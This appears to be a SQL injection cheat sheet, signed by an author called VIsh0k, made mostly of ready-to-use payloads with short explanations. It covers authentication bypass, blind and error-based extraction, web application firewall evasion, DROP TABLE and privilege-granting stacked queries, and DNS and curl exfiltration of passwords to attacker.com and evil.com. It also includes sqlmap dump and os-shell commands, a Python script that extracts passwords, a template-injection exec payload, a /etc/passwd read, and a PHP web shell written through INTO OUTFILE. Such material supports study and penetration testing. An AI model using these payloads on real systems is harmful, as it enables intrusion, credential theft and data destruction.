### ðŸ›¡ï¸ Introduction to SQL Injection (SQLi)

**SQL Injection (SQLi)** is a code injection technique that exploits vulnerabilities in an applicationâ€™s software by inserting malicious SQL code into a query. This allows attackers to manipulate the database, extract sensitive data, modify records, or even execute system commands.

  * **How It Works:** Applications often build SQL queries by concatenating user input directly into the query string. If input is not properly sanitized, attackers can inject SQL syntax to alter the queryâ€™s logic.
  * **Common Entry Points:** Login forms, search fields, URL parameters, HTTP headers, and file uploads.
  * **Impact:** Data leakage (e.g., user credentials, personal information), data manipulation (e.g., altering balances, deleting records), privilege escalation, and in some cases, remote code execution.

-----

### ðŸ“ Basic SQL Injection Payloads and Impact

The most common SQL injection attacks involve manipulating query logic to bypass authentication, extract data, or disrupt database operations.

  * **Authentication Bypass**

    ```sql
    ' OR '1'='1 --
    ```

    **Why it's used:** To bypass login forms and gain unauthorized access.
    **How it works:** The injected condition `'1'='1'` always evaluates to true, causing the query to return all rows, often logging in as the first user.

  * **Extracting Data with UNION**

    ```sql
    ' UNION SELECT 1,2,3 --
    ```

    **Why it's used:** To determine the number of columns in the query and prepare for data extraction.
    **How it works:** The `UNION` operator combines results from multiple SELECT statements. The attacker first matches the column count, then replaces columns with desired data.

  * **Reading Database Information**

    ```sql
    ' UNION SELECT version(), database(), user() --
    ```

    **Why it's used:** To gather information about the database system, current database, and user.
    **How it works:** The attacker uses built-in database functions to retrieve system metadata.

-----

### ðŸ–¼ï¸ SQL Injection in Different Contexts

SQL injection can occur in various parts of an application, including within JSON, XML, or even HTTP headers.

  * **SQLi in HTTP Headers**

    ```http
    GET /page HTTP/1.1
    Host: vulnerable.com
    X-Forwarded-For: ' UNION SELECT 1,2,3 --
    ```

    **Why it's used:** When applications use header values (like `X-Forwarded-For`) in SQL queries without sanitization.
    **How it works:** The attacker injects SQL into a header field that is logged or processed by the database.

  * **SQLi in JSON Payloads**

    ```json
    {
      "username": "admin' --",
      "password": "any"
    }
    ```

    **Why it's used:** In APIs that accept JSON input and concatenate values directly into SQL statements.
    **How it works:** The attacker escapes the JSON string and injects SQL syntax to manipulate the query.

-----

### ðŸ¤« Blind SQL Injection and Out-of-Band (OOB) Exfiltration

Blind SQL injection occurs when the application does not return query results or errors directly, but the attacker can infer information based on behavior changes.

  * **Boolean-Based Blind SQLi**

    ```sql
    ' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a' --
    ```

    **Why it's used:** To extract data bit-by-bit by observing differences in application responses (e.g., "Login failed" vs. "User not found").
    **How it works:** The attacker injects a condition that returns true or false, influencing the applicationâ€™s output or behavior.

  * **Time-Based Blind SQLi**

    ```sql
    ' AND IF(1=1, SLEEP(5), 0) --
    ```

    **Why it's used:** When no visible output changes exist, but the attacker can measure response delays.
    **How it works:** The attacker injects a time-delaying function (e.g., `SLEEP()`, `WAITFOR DELAY`) and observes if the response is delayed, confirming injection and extracting data through binary search.

  * **Out-of-Band (OOB) SQLi**

    ```sql
    ' UNION SELECT LOAD_FILE(CONCAT('\\\\', (SELECT database()), '.attacker.com\\a')) --
    ```

    **Why it's used:** When the application does not return query results or errors, but can initiate network requests (DNS, HTTP).
    **How it works:** The attacker forces the database to make an external request containing stolen data, which is captured by the attackerâ€™s server.

-----

### ðŸŒ€ Advanced SQL Injection Techniques

Attackers use advanced methods to bypass defenses, escalate privileges, and achieve remote code execution.

  * **Second-Order SQL Injection**

    ```sql
    Username: admin'--
    Password: anything
    ```

    **Why it's used:** When input is stored and later used in a query without sanitization (e.g., during password reset).
    **How it works:** The attacker injects payloads that are harmless when stored but become active when retrieved and executed in a later query.

  * **Stacked Queries**

    ```sql
    '; DROP TABLE users; --
    ```

    **Why it's used:** To execute multiple SQL statements in a single request, enabling data manipulation or destruction.
    **How it works:** The attacker uses a semicolon to separate queries, allowing additional commands to run (supported in some databases like MSSQL and PostgreSQL).

  * **Privilege Escalation via SQLi**

    ```sql
    '; GRANT DBA TO admin; --
    ```

    **Why it's used:** To elevate database user privileges, enabling broader access and control.
    **How it works:** The attacker injects a privilege-granting command, often after determining the current user has sufficient rights.

-----

### ðŸ“¡ Advanced Blind SQLi with Conditional Errors

In some databases, error messages can be triggered conditionally to extract data without direct output.

  * **Error-Based Blind SQLi in MySQL**

    ```sql
    ' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT((SELECT version()), FLOOR(RAND(0)*2)) x FROM information_schema.tables GROUP BY x) y) --
    ```

    **Why it's used:** To force duplicate key errors that reveal data in the error message.
    **How it works:** The attacker uses `RAND()` and `GROUP BY` to generate a duplicate entry error, embedding query results in the error message.

  * **Error-Based Blind SQLi in SQL Server**

    ```sql
    ' AND 1=CONVERT(int, (SELECT TOP 1 name FROM sysobjects WHERE xtype='U')) --
    ```

    **Why it's used:** To trigger type conversion errors that leak data.
    **How it works:** The attacker attempts to convert a string (e.g., table name) to an integer, causing an error that includes the string.

-----

### ðŸ›¡ï¸ Bypassing Web Application Firewalls (WAFs)

Attackers use various techniques to evade WAF detection while still executing SQLi payloads.

  * **Case Variation and Encoding**

    ```sql
    UnIoN SeLeCt 1,2,3 --
    ```

    **Why it's used:** To bypass case-sensitive WAF rules.
    **How it works:** The attacker alternates letter casing to avoid keyword detection.

  * **Inline Comments**

    ```sql
    UNI/**/ON SEL/**/ECT 1,2,3 --
    ```

    **Why it's used:** To break up keywords without affecting SQL execution.
    **How it works:** The attacker inserts comments (`/**/`) within SQL keywords to evade pattern matching.

  * **Hex and Base64 Encoding**

    ```sql
    UNION SELECT 0x73656c656374 --
    ```

    **Why it's used:** To encode payloads and bypass string-based filters.
    **How it works:** The attacker uses hex encoding (`0x...`) or Base64 functions (`FROM_BASE64()`) to hide malicious keywords.

  * **Using Alternative Syntax**

    ```sql
    ' OR 1 LIKE 1 --
    ```

    **Why it's used:** To replace common operators (`=`) with less-common ones (`LIKE`).
    **How it works:** The attacker uses SQL synonyms and alternative syntax to achieve the same result while avoiding detection.

-----

### ðŸ§¬ Advanced Data Exfiltration Techniques

When direct data extraction is blocked, attackers use creative methods to leak information.

  * **Exfiltrating Data via DNS in Blind SQLi**

    ```sql
    ' UNION SELECT LOAD_FILE(CONCAT('\\\\', (SELECT password FROM users LIMIT 1), '.attacker.com\\a')) --
    ```

    **Why it's used:** To bypass network restrictions and exfiltrate data via DNS queries.
    **How it works:** The attacker forces the database to resolve a domain containing stolen data, which is logged by the attackerâ€™s DNS server.

  * **Exfiltrating Data via HTTP Requests**

    ```sql
    '; EXEC xp_cmdshell 'curl http://attacker.com/?data=' + (SELECT password FROM users) --
    ```

    **Why it's used:** When the database server can make outbound HTTP requests (e.g., via `xp_cmdshell` in MSSQL).
    **How it works:** The attacker uses system commands to send HTTP requests containing stolen data.

  * **Exfiltrating Data via Time Delays and Binary Search**

    ```sql
    ' AND IF(ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1)) > 64, SLEEP(5), 0) --
    ```

    **Why it's used:** To extract data bit-by-bit without direct output.
    **How it works:** The attacker uses time delays to infer character values through binary search, measuring response times to determine true/false conditions.

-----

### ðŸ•µï¸â€â™€ï¸ Detection and Exploitation Tools

Attackers use a variety of tools to automate SQL injection discovery and exploitation.

  * **sqlmap â€“ Automated SQL Injection Tool**

    ```bash
    sqlmap -u "http://vulnerable.com/page?id=1" --dbs
    sqlmap -u "http://vulnerable.com/page?id=1" -D dbname -T users --dump
    sqlmap -u "http://vulnerable.com/page?id=1" --os-shell
    ```

    **Why it's used:** To automate detection, exploitation, and data exfiltration.
    **How it works:** sqlmap sends crafted payloads, analyzes responses, and escalates access to extract data or execute commands.

  * **Burp Suite â€“ Manual Testing and Intruder**

    **Why it's used:** For manual payload testing, fuzzing, and analyzing application behavior.
    **How it works:** The attacker uses Burpâ€™s Proxy, Repeater, and Intruder tools to send custom payloads and observe responses.

  * **Custom Python Scripts for Blind SQLi**

    ```python
    import requests
    import time

    url = "http://vulnerable.com/login"
    chars = "abcdefghijklmnopqrstuvwxyz0123456789"
    password = ""

    for i in range(1, 20):
        for c in chars:
            payload = f"' AND IF(SUBSTRING((SELECT password FROM users LIMIT 1),{i},1)='{c}', SLEEP(5), 0) --"
            data = {"username": "admin", "password": payload}
            start = time.time()
            requests.post(url, data=data)
            end = time.time()
            if end - start > 4:
                password += c
                print(f"Found: {password}")
                break
    ```

    **Why it's used:** To automate time-based blind SQLi extraction.
    **How it works:** The script iterates through possible characters and uses response delays to infer the correct ones.

-----

### ðŸ§ª Real-World Examples and Case Studies

  * **Case Study: Heartland Payment Systems (2009)**
    * **What happened:** SQL injection was used to inject malware into payment systems, leading to the theft of 130 million credit card numbers.
    * **How it worked:** Attackers exploited SQLi vulnerabilities to gain database access, then installed malware to capture card data in real-time.

  * **Example: Vulnerable Login Form**

    ```php
    $query = "SELECT * FROM users WHERE username='" . $_POST['username'] . "' AND password='" . $_POST['password'] . "'";
    ```

    **Payload:** `admin' OR '1'='1 --`
    **Result:** Logs in as the first user in the `users` table.

  * **Advanced Case: Data Exfiltration via DNS**

    ```sql
    ' UNION SELECT LOAD_FILE(CONCAT('\\\\', (SELECT password FROM users LIMIT 1), '.evil.com\\a')) --
    ```

    **Result:** The password is sent as a subdomain in a DNS query to `evil.com`, where the attacker captures it.

-----


### ðŸ§¬ Advanced Scenarios: SQLi with Server-Side Template Injection (SSTI)

When SQLi is combined with SSTI, attackers can achieve remote code execution by injecting template expressions into server responses.

  * **Payload Example**

    ```sql
    UNION SELECT '{{7*7}}' --
    ```

    **Why it's used:** To test if the server evaluates injected template code.
    **How it works:** If the server returns `49`, SSTI is confirmed, enabling further exploitation.

  * **Advanced SSTI + SQLi Payload**

    ```sql
    UNION SELECT '{{request.application.globals.builtins.exec("id")}}' --
    ```

    **Why it's used:** To execute system commands via the template engine.
    **How it works:** The attacker injects a template expression that calls dangerous built-in functions, leading to RCE.

-----

### ðŸ“„ PHP File Reading and Writing Exploits via SQLi

If the database supports file operations (e.g., `LOAD_FILE()`, `INTO OUTFILE`), SQLi can be used to read or write files on the server.

  * **Reading Local Files**

    ```sql
    UNION SELECT LOAD_FILE('/etc/passwd') --
    ```

    **Why it's used:** To read sensitive system files.
    **How it works:** The `LOAD_FILE()` function reads and returns the content of a specified file.

  * **Writing a Web Shell**

    ```sql
    UNION SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE '/var/www/html/shell.php' --
    ```

    **Why it's used:** To upload a backdoor for persistent access.
    **How it works:** The `INTO OUTFILE` clause writes arbitrary content to a file, often leading to RCE if the file is accessible via web.

-----

### ðŸ”’ File Permissions and secure_file_priv in MySQL

MySQLâ€™s `secure_file_priv` variable restricts file operations to a specific directory, limiting the impact of file-related SQLi.

  * **Checking secure_file_priv**

    ```sql
    SHOW VARIABLES LIKE 'secure_file_priv';
    ```

    **Why it's used:** To determine if file operations are possible and where files can be written/read.
    **How it works:** If `secure_file_priv` is empty, file operations may be allowed anywhere; if set, operations are restricted to the specified directory.

  * **Bypassing secure_file_priv via DNS Exfiltration**

    ```sql
    UNION SELECT LOAD_FILE(CONCAT('\\\\', (SELECT password FROM users), '.attacker.com\\a')) --
    ```

    **Why it's used:** When `secure_file_priv` blocks local file writing, attackers can still exfiltrate data via DNS.
    **How it works:** The `LOAD_FILE()` function is used to trigger a DNS resolution, leaking data in the subdomain.

-----

**Made with love by VIsh0k**